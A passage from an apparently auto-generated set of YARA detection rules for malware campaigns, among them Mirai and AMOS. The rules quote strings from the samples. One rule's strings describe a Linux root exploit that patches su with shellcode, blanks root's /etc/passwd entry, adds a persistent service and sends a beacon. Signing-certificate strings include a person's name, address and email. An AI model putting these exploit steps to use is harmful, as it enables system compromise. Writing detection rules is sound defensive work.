        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-43a73e68.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "' ( ) * + , - . /n0a1m2e3=4\"5M6i7c8r9o:s;o<f=t>.?W@iAnBdCoDwEsF.GCHoImJmKoLnM-NCOoPnQtRrSoTlUsV\"W" ascii
        $s1 = "J K L M N O P<QdRpSiTAUwVaWrXeY Zx[m\\l]n^s_=`\"ahbtctdpe:f/g/hsicjhkelmmanso.pmqircsrtousvowfxty.zc{o" ascii
        $s2 = "0A1d2d3r4e5s6s7 8%9p: ;h<a=s> ?n@oA BiCmDaEgFeG-HsIeJcKtLiMoNnO" ascii
        $s3 = ">a?p@iA-BmCsD-EwFiGnH-IcJrKtL-MmNaOtPhQ-RlS1T-U1V-W0X.YdZl[l\\" ascii
        $s4 = "AABrCgDuEmFeGnHtI JdKoLmMaNiOnP QeRrSrToUrV W(XDYOZM[A\\I]N^)_" ascii
        $s5 = "N!OTPhQiRsS TpUrVoWgXrYaZm[ \\c]a^n_n`oatb cbdee frguhni jiknl mDnOoSp qmrosdteu.v$w" ascii
        $s6 = "HaIpJiK-LmMsN-OwPiQnR-ScTrUtV-WsXtYdZi[o\\-]l^1_-`1a-b0c.ddelflg" ascii
        $s7 = "_ s!e\"t#_$i%n&v'a(l)i*d+_,p-a.r/a0m1e2t3e4r5_6h7a8n9d:l;e<r=" ascii
        $s8 = ". / 0 1 2<3a4s5m6v738:9w:i;n<d=o>w?s@SAeBtCtDiEnFgGsH>I" ascii
        $s9 = "P Q RVSiTrUtVuWaXlYQZu[e\\r]y^ _f`aaiblcedde ffgohri j%kdl mbnyotpeqsr sattu vawdxdyrze{s|s} ~%" ascii
        $s10 = "W X Y Z [v\\e]r^s_i`oanb=c\"d1e3f.g4h3i.j4k6l3m.n8o4p2q\"r" ascii
        $s11 = "%I&n'i(t)i*a+l,i-z.e/C0r1i2t3i4c5a6l7S8e9c:t;i<o=n>" ascii
    condition:
        filesize < 4097024 and 12 of them
}

rule Sightlines_imphash_15c59c97_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-15c59c97"
        date = "2026-10-16"
        campaign = "imphash-15c59c97"
        family = ""
        hash = "052a2258a185f4c858326ff1a5754b2c4c2bf680c12ebf30a3c2b2b9c1af8f68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-15c59c97.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "host.UI.RawUI.BufferSize = new-object System.Management.Automation.Host.Size(1024,50);\" \"&\"\"%s\"\"\" 2>" wide
        $s1 = ".?AV<lambda_1>@?1??OnPropChanged@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s2 = ".?AV<lambda_1>@?1??UpdateFromProperty@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s3 = "Caphyon\\Advanced Installer\\[ProductCode]\\[AI_EXTERNALUIUNINSTALLERNAME]" wide
        $s4 = ".?AV<lambda_1>@?1??UpdateWindowText@TextControlWinRT@@UAEXABV?$basic_string@_WU?$char_traits@_W@std@" ascii
        $s5 = ".?AV<lambda_1>@?1??InitControl@CheckBoxControlWinRT@@UAEXXZ@" ascii
        $s6 = ".?AV<lambda_1>@?1??SetAsDefaultButton@ImageButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s7 = ".?AV<lambda_1>@?1??SetAsDefaultButton@PushButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s8 = ".?AV<lambda_1>@?6??OnDdx@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s9 = ".?AV<lambda_1>@?1??ShowControl@WinRTControlBase@@UAEX_N@Z@" ascii
        $s10 = ".?AV<lambda_1>@?1??DoSaveData@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s11 = "<http://cert.ssl.com/SSLcom-SubCA-CodeSigning-RSA-4096-R1.cer0 " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 27452032 and 11 of them
}

rule Sightlines_rich_header_hash_2c5c1875_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-2c5c1875"
        date = "2026-10-16"
        campaign = "rich_header_hash-2c5c1875"
        family = ""
        hash = "052a2258a185f4c858326ff1a5754b2c4c2bf680c12ebf30a3c2b2b9c1af8f68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-2c5c1875.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "host.UI.RawUI.BufferSize = new-object System.Management.Automation.Host.Size(1024,50);\" \"&\"\"%s\"\"\" 2>" wide
        $s1 = ".?AV<lambda_1>@?1??OnPropChanged@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s2 = ".?AV<lambda_1>@?1??UpdateFromProperty@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s3 = "Caphyon\\Advanced Installer\\[ProductCode]\\[AI_EXTERNALUIUNINSTALLERNAME]" wide
        $s4 = ".?AV<lambda_1>@?1??UpdateWindowText@TextControlWinRT@@UAEXABV?$basic_string@_WU?$char_traits@_W@std@" ascii
        $s5 = ".?AV<lambda_1>@?1??InitControl@CheckBoxControlWinRT@@UAEXXZ@" ascii
        $s6 = ".?AV<lambda_1>@?1??SetAsDefaultButton@ImageButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s7 = ".?AV<lambda_1>@?1??SetAsDefaultButton@PushButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s8 = ".?AV<lambda_1>@?6??OnDdx@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s9 = ".?AV<lambda_1>@?1??ShowControl@WinRTControlBase@@UAEX_N@Z@" ascii
        $s10 = ".?AV<lambda_1>@?1??DoSaveData@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s11 = "<http://cert.ssl.com/SSLcom-SubCA-CodeSigning-RSA-4096-R1.cer0 " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 27452032 and 11 of them
}

rule Sightlines_host_7a6a071f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-7a6a071f"
        date = "2026-10-16"
        campaign = "host-7a6a071f"
        family = "mirai"
        hash = "01c97268134bd3bcb04f32567f2c8b5fa2aafab4f268e7ce70ae3731566133bf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-7a6a071f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Connection: keep-alive" ascii
        $s1 = "POST %s HTTP/1.1" ascii
        $s2 = "/proc/self/maps" ascii
        $s3 = "GET %s HTTP/1.1" ascii
        $s4 = "__cxa_atexit" ascii
        $s5 = "/index.php" ascii
        $s6 = "LD_PROFILE" ascii
        $s7 = "/usr/lib/" ascii
        $s8 = "LD_AUDIT" ascii
        $s9 = "LD_DEBUG" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2147280 and 10 of them
}

rule Sightlines_signer_cert_sha1_b0e443fb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-b0e443fb"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-b0e443fb"
        family = ""
        hash = "052a2258a185f4c858326ff1a5754b2c4c2bf680c12ebf30a3c2b2b9c1af8f68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-b0e443fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<http://cert.ssl.com/SSLcom-SubCA-CodeSigning-RSA-4096-R1.cer0 " ascii
        $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " ascii
        $s2 = "+SSL.com Code Signing Intermediate CA RSA R10" ascii
        $s3 = "(SSL.com Root Certification Authority RSA0" ascii
        $s4 = "https://www.ssl.com/repository0" ascii
        $s5 = "Pelican Finland Holding Oy0" ascii
        $s6 = "Pelican Self Storage1#0!" ascii
        $s7 = "SSL Corporation110/" ascii
        $s8 = "270826130109Z0v1" ascii
        $s9 = "410212173939Z0|1" ascii
        $s10 = "341112185005Z0n1" ascii
        $s11 = "341112185005Z0s1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 24638128 and 12 of them
}

rule Sightlines_tlsh_c0f587c4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c0f587c4"
        date = "2026-10-16"
        campaign = "tlsh-c0f587c4"
        family = ""
        hash = "244b0b3890f59b5ef20526fe8a52e827900a9fe1f723f58c3d074dcf3f232adb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c0f587c4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/odtheking/odin/features/impl/skyblock/QuiverDisplay$quiverHud$2.classPK" ascii
        $s1 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$STARTS_WITH.classPK" ascii
        $s2 = "com/odtheking/odin/features/impl/boss/WitherDragonsEnumKt$handleSpawnPacket$2$1.classPK" ascii
        $s3 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$NUMBERS.classPK" ascii
        $s4 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$overflowManaHud$2.classPK" ascii
        $s5 = "com/odtheking/odin/utils/network/WebUtils$sam$java_util_function_BiConsumer$0.classPK" ascii
        $s6 = "com/odtheking/odin/features/impl/boss/termGUI/MelodyGui$buildTerminal$1$1.classPK" ascii
        $s7 = "com/odtheking/odin/features/impl/skyblock/ChatCommands$partyAllInvite$2.classPK" ascii
        $s8 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$hideOverflow$2.classPK" ascii
        $s9 = "com/odtheking/odin/features/impl/dungeon/InvincibilityTimer$equippedMaskColor$2.classPK" ascii
        $s10 = "com/odtheking/odin/features/impl/skyblock/PlayerDisplay$hideZeroSF$2.classPK" ascii
        $s11 = "com/odtheking/odin/utils/skyblock/dungeon/terminals/TerminalTypes$MELODY.classPK" ascii
    condition:
        filesize < 10795080 and 12 of them
}

rule Sightlines_signer_cert_sha1_055cf2db_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-055cf2db"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-055cf2db"
        family = ""
        hash = "086e083da4e7a46438aff3188beb2c0d14cb38af216c62a880cd8209dfcfcca8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-055cf2db.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "250911201113Z0t1" ascii
        $s1 = "230012+5029260" ascii
        $s2 = "240912201113Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2816096 and 3 of them
}

rule Sightlines_signer_cert_sha1_8f60bad4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-8f60bad4"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-8f60bad4"
        family = ""
        hash = "23f04ba936568e9a7c9dce7a6beb52c9be7eb13b734cd390c99e7546cbe1973d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-8f60bad4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "AddTrust External TTP Network1\"0 " ascii
        $s1 = ".?AV_Iostream_error_category@std@@" ascii
        $s2 = "AddTrust External CA Root0" ascii
        $s3 = "Melnikova st. 15, 5 apt.1" ascii
        $s4 = "mail.to.twaego@gmail.com0" ascii
        $s5 = "UTN-USERFirst-Object0" ascii
        $s6 = "Artem Shevchenko0" ascii
        $s7 = "Artem Shevchenko1" ascii
        $s8 = "AddTrust AB1&0$" ascii
        $s9 = "Salt Lake City1" ascii
        $s10 = "301231235959Z0|1" ascii
        $s11 = "200530104838Z0z1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 30458592 and 11 of them
}

rule Sightlines_tlsh_022db377_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-022db377"
        date = "2026-10-16"
        campaign = "tlsh-022db377"
        family = "mirai"
        hash = "0c0dd052789ca7513dfa96a62727b31735f219c14da0de7fea1a7216bab7bc57"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-022db377.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "[+] mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)" ascii
        $s1 = "[0m BUG: byte changed but desired-value check mismatched index=%zu offset=%llu desired=%02x got=%02x" ascii
        $s2 = "[+] PRIMITIVE proven: root entry has empty passwd field via NSS." ascii
        $s3 = "[0m BUG: final verify mismatch index=%zu offset=%llu desired=%02x got=%02x" ascii
        $s4 = "[+] rxrpc module autoloaded via dummy socket(AF_RXRPC)" ascii
        $s5 = "[*] /etc/passwd line 1 (root entry) BEFORE: '" ascii
        $s6 = "[+] uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within netns" ascii
        $s7 = "cat > \"$d/network-dispatch.service\" <<EOF" ascii
        $s8 = "{\"id\":\"%s\",\"cmp\":\"%s\",\"stage\":\"beacon\",\"uptime\":%u,\"token\":\"eyJhbGciOiJIUzI1NiJ9.decoy.token\"}" ascii
        $s9 = "[*] /etc/passwd line 1 (root entry) AFTER:  '" ascii
        $s10 = "[su] /usr/bin/su page-cache patched (entry 0x%x = shellcode)" ascii
        $s11 = "[0m fixed behavior: byte unchanged at index=%zu offset=%llu" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1111288 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_70bf71f0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-70bf71f0"
        date = "2026-10-16"
        campaign = "dotnet_typelib_guid-70bf71f0"
        family = ""
        hash = "50a3617137f6266d4d450230a6754ca3aa43ddb183159cd47041e83d54b629ba"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-70bf71f0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "      <!--<supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\" />-->" ascii
        $s2 = "      <!--<supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\" />-->" ascii
        $s3 = "      <!--<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\" />-->" ascii
        $s4 = "      <!--<supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\" />-->" ascii
        $s5 = "DOANHEQTCSDL.BitmapChannelStreaming.resources" ascii
        $s6 = "      <!--<supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\" />-->" ascii
        $s7 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s8 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">" ascii
        $s9 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s10 = "DOANHEQTCSDL.TrungBinhMatHang.resources" ascii
        $s11 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7741440 and 12 of them
}

rule Sightlines_tlsh_62b21177_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-62b21177"
        date = "2026-10-16"
        campaign = "tlsh-62b21177"
        family = ""
        hash = "a2ac7069a0da876d52fa1d031ee1b4e4ccd5323014dab36507eee3f6eb7a60c7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-62b21177.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "LnJcHBwkOKam8Ve0tMdzxsZRl+joI8vd3XyhdHSc6B8fIT5LS92Wvb3cYYuLhg2KioUPcHCQ4D4+Qny1tcRxZmaqzEhI2JADAwUG" ascii
        $s1 = "89xxbN66x/ruvbBAv7Qp1o+zXnUa18DjKtC3WXvZLs9L3lleVmHJyGZmvnI3byfkB2hQR5IMztGiC7lr8wIg/cMFVwjODdqe/gqt" ascii
        $s2 = "olcYZ0I+ZA7OXBJ4hxe5wboGy8Km/rqFhCRYxW3enbF1jTnAMT2CulFzXNs+pJmqd6fWlDpk96PyX+JvBrUbqiaW+pA12ltTS9WV" ascii
        $s3 = "eoMlvSEJ3PkTkdH2L6l8c0cylAFH9SKB5eU63NrCNzR2tcin3fOaRmFEqQ4D0A8+x8jsQR51pJnNOOIvDuo7obuAMjGzPhg4i1RO" ascii
        $s4 = "iZ8lgHBvzp6jGx2bGtwR6DJfezZuEPmUhX8C+gbBG08bXNjIQLOX9qF/bnOAmdzfk6Wt6qPTpDHo3slTmmgitKmK7Iah5NV0rJWc" ascii
        $s5 = "/E9i+/BIAgHTvndqQMqa6boMwCsR9pvuJDrYhhjQ6OvLOCz1mYMUewwgvlD0h4NBddjR3Utzs5KP5hxycPV89iM6tF/f3qZaWOwT" ascii
        $s6 = "vXMtBEQKeW2kPnKWyuLpaSONh0HqVgNB8XUGHfwA/HmHtx7dltG6RcWbb+j7selPdYPwxV3hClg34/LB4qZTJWCxMfFy3iED0wnB" ascii
        $s7 = "zp6jGx2bGtwR6DJfezZuEPmUhX8C+gbBG08bXNjIQLOX9qF/bnOAmdzfk6Wt6qPTpDHo3slTmmgitKmK7Iah5NV0rJWc5WzwFZYN" ascii
        $s8 = "wlAMk5US2R1WaIvn1Llxjxa0s4ofjYnciIROGhdqtrXBkXT0wC7ul/lmTSiONgCxenWK1H84dww+2pSVjIfLUWgG/yfZvP/GQYD9" ascii
        $s9 = "a+RZWFmkvG/I5A4W2zIbeNQdqwv1Rjzra/UljB0AE91ZCxS7NsBr/o0DAIwHKsfkx3s8Phtk1ynDa0AugsZrViggYRO1u9chITGc" ascii
        $s10 = "4bsMIHsXGCsfUmRqyD5zAnbYZAiK2Qb6L/Fr7tIaJtLjzp1hJUrglIwe1zMJ24yu9avH5OGmhQ+Xs30MBl1XceqKCu/bWASF++xk" ascii
        $s11 = "8CUlb0ouLnJcHBwkOKam8Ve0tMdzxsZRl+joI8vd3XyhdHSc6B8fIT5LS92Wvb3cYYuLhg2KioUPcHCQ4D4+Qny1tcRxZmaqzEhI" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 30998528 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_47884ce1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-47884ce1"
        date = "2026-10-16"
        campaign = "dotnet_typelib_guid-47884ce1"
        family = ""
        hash = "07542948284356edd464a42312bcb8d55c6c6b9ab4920055d8aa62d229f6f857"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-47884ce1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<Colombier.FormAccueil+SignalDrivenExtractor+<ScanPixels>d__1" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "System.Collections.Generic.IEnumerator<System.Byte>.get_Current" ascii
        $s5 = "System.Collections.Generic.IEnumerable<System.Byte>.GetEnumerator" ascii
        $s6 = "System.Collections.Generic.IEnumerator<System.Byte>.Current" ascii
        $s7 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s8 = "Aucun rapport disponible. Lancez d'abord la simulation de la prairie." wide
        $s9 = " une grande part du foin : fiez-vous mieux " wide
        $s10 = "cision, avec quelques compromis entre qualit" wide
        $s11 = "cision moyenne : revoyez la date de coupe ou la dur" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1605632 and 12 of them
}

rule Sightlines_tlsh_e6b88f9e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e6b88f9e"
        date = "2026-10-16"
        campaign = "tlsh-e6b88f9e"
        family = ""
        hash = "35bb5a32f866cf66288451eb5f04c568d58ae85dbd5b876abdb84932275215ae"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e6b88f9e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "DELETE FROM tableinfo WHERE NameOfStore = ('" wide
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "Select * from tableinfo WHERE NameOfStore = '" wide
        $s5 = "Server = localhost; Database=kara; Port = 4306; User ID = root ; Password =;" wide
        $s6 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s7 = "UPDATE tableinfo set NameOfStore = ('" wide
        $s8 = "viewYourAccountToolStripMenuItem_Click" ascii
        $s9 = "DELETE FROM menu WHERE NameOfFood = ('" wide
        $s10 = "KaraokeManager.FrmEditAccount.resources" ascii
        $s11 = "KaraokeManager.FrmViewAccount.resources" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1631232 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_9beec038_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-9beec038"
        date = "2026-10-16"
        campaign = "dotnet_typelib_guid-9beec038"
        family = ""
        hash = "152d4753839330b04a221d9e97093de27dcf5a4231fbd948940da26d909dd5b1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-9beec038.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "Brzina vodenog kola: Prosjek 14.8 o/min (vrh 18.2)" wide
        $s3 = "Efektivni raspon plime danas: {0:0.00} m (Sizik: {1:0.00} m | Kvadratura: {2:0.00} m)" wide
        $s4 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s5 = "Iskoristivost mljevenja: {0:0.1}% fino bra" wide
        $s6 = "Brzina vodenog kola: Prosjek {0:0.1} o/min (vr" wide
        $s7 = "Radni sati po ovoj plimi: {0:0.1} h efektivnog mljevenja" wide
        $s8 = "no spremljen u XML validiran prema MlinDnevnikShema.xsd:" wide
        $s9 = "Kvadraturni manjak: Nema gubitaka (pun pogonski potencijal)" wide
        $s10 = "Potencijalna energija po plimi: {0:N0} kWh" wide
        $s11 = "Datoteka PodaciKonfiguracije.xml nije prona" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2622464 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_4b1fd03c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-4b1fd03c"
        date = "2026-10-16"
        campaign = "dotnet_typelib_guid-4b1fd03c"
        family = ""
        hash = "5ae667a2ffce6864964f906c2ec7049b342a534ebb8e38a8d0640e6656e0de7a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-4b1fd03c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s1 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "A+ (Vrhunsko porinuce brodogradilista Klajd)" wide
        $s4 = "Uslovno prihvatljivo (B-) - Zaustavni put je bio preblizu suprotne obale reke Klajd. Potrebna je rev" wide
        $s5 = "5. Vodonepropusno ispitivanje tankova (88%):" wide
        $s6 = "Faza 3: Izbijeni drveni klinovi! Trup klizi krmom napred u reku Klajd." wide
        $s7 = "Reka Klajd (Visoka voda / Plima +3.75 m)" wide
        $s8 = "The value for column 'c' in table 'DataTable1' is DBNull." wide
        $s9 = "Izgradnja trupa kompletirana 100%! Spreman za podmazivanje i porinu" wide
        $s10 = "Moment uzgona nadvladava moment mase. Kobilica se rotira, prednje sanke primaju vr" wide
        $s11 = "4. Pneumatsko i rucno zakivanje (92%):" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2542592 and 12 of them
}

rule Sightlines_tlsh_322cdf80_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-322cdf80"
        date = "2026-10-16"
        campaign = "tlsh-322cdf80"
        family = ""
        hash = "0f8976cee8d60f7c8c2826f36db4a09f30fff94effb652cabca2efda9b4c2bf2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-322cdf80.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "'System.Globalization.DateTimeFormatInfo+" ascii
        $s5 = "+System.Globalization.GregorianCalendarTypes" ascii
        $s6 = "matInfo&System.Globalization.GregorianCalendar" ascii
        $s7 = "(System.Globalization.DateTimeFormatFlags" ascii
        $s8 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator" ascii
        $s9 = "Izvoz nije uspio ili datoteka ne zadovoljava XSD." wide
        $s10 = "ene zadane vrijednosti (nisu spremljene)." wide
        $s11 = "FAD8FE75086C160174BE22832BEBEBC9DA04C4CB395275AD8ADB10EA3A949B3F" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1713152 and 12 of them
}

rule Sightlines_tlsh_b49b9096_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b49b9096"
        date = "2026-10-16"
        campaign = "tlsh-b49b9096"
        family = ""
        hash = "3ea03e28c0a5a8c8a4910f26b2a1ee073053f76cbd9d21729dcec81543ac1617"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b49b9096.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "Brzina vodenog kola: Prosjek 14.8 o/min (vrh 18.2)" wide
        $s4 = "Efektivni raspon plime danas: {0:0.00} m (Sizik: {1:0.00} m | Kvadratura: {2:0.00} m)" wide
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s6 = "Iskoristivost mljevenja: {0:0.1}% fino bra" wide
        $s7 = "Brzina vodenog kola: Prosjek {0:0.1} o/min (vr" wide
        $s8 = "Radni sati po ovoj plimi: {0:0.1} h efektivnog mljevenja" wide
        $s9 = "no spremljen u XML validiran prema MlinDnevnikShema.xsd:" wide
        $s10 = "Kvadraturni manjak: Nema gubitaka (pun pogonski potencijal)" wide
        $s11 = "Potencijalna energija po plimi: {0:N0} kWh" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1841152 and 12 of them
}

rule Sightlines_tlsh_1cb5eb26_amos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1cb5eb26"
        date = "2026-10-16"
        campaign = "tlsh-1cb5eb26"
        family = "amos"
        hash = "57a671a61a6fbebe17b09d9baa5712d3b0af8232fd807697183c6b1fb67286a4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1cb5eb26.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" ascii
        $s1 = "/System/Library/Frameworks/Security.framework/Versions/A/Security" ascii
        $s2 = "/usr/lib/libSystem.B.dylib" ascii
        $s3 = "/usr/lib/libc++.1.dylib" ascii
        $s4 = "@___stack_chk_guard" ascii
        $s5 = "@dyld_stub_binder" ascii
        $s6 = "@_mach_task_self_" ascii
        $s7 = "@___stack_chk_fail" ascii
        $s8 = "@_pthread_once" ascii
        $s9 = "__la_symbol_ptr" ascii
        $s10 = "__mod_init_func" ascii
        $s11 = "@___clear_cache" ascii
    condition:
        filesize < 2661984 and 12 of them
}

rule Sightlines_host_93c2dc5c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-93c2dc5c"
        date = "2026-10-16"
        campaign = "host-93c2dc5c"
        family = "mirai"
        hash = "00b8c81a2b43524469dd3fa7a121e8c8701e7355ae5440bf108a54daac958fff"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-93c2dc5c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
